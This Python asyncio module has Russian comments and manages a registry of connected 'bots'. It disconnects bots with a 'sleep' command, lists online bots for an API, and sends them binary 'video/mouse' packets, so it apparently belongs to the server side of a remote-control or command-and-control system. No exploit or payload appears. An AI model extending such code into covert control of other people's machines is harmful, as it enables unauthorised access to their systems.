from logs import Log as logger

# Реестр активных сокетов (обязательно должен быть тут)
client = {}  # {id: (reader, writer)}

async def close_client(client_id: str, send_sleep: bool = True) -> bool:
    """Отключает бота и удаляет его из активных соединений."""
    if client_id in client:
        _, writer = client[client_id]
        try:
            if send_sleep:
                writer.write(b"sleep\n")
                await writer.drain()
            writer.close()
            await writer.wait_closed()
        except: pass
        finally:
            client.pop(client_id, None)
            logger.info(f"[-] Бот {client_id} отключен")
        return True
    return False

async def close_all_client() -> int:
    """Отключает всех ботов."""
    ids = list(client.keys())
    for cid in ids: await close_client(cid)
    return len(ids)

def list_clients() -> list:
    """
    Возвращает список ID онлайн-ботов. 
    API использует это для отображения статуса.
    """
    return [{"id": cid, "status": "online"} for cid in client.keys()]

async def send_binary_to_bot(bot_id: str, packet: bytes) -> bool:
    """Отправляет бинарный пакет (видео/мышь) боту."""
    if bot_id in client:
        try:
            _, writer = client[bot_id]
            writer.write(packet)
            await writer.drain()
            return True
        except Exception as e:
            logger.error(f"[Services] Send error to {bot_id}: {e}")
    return False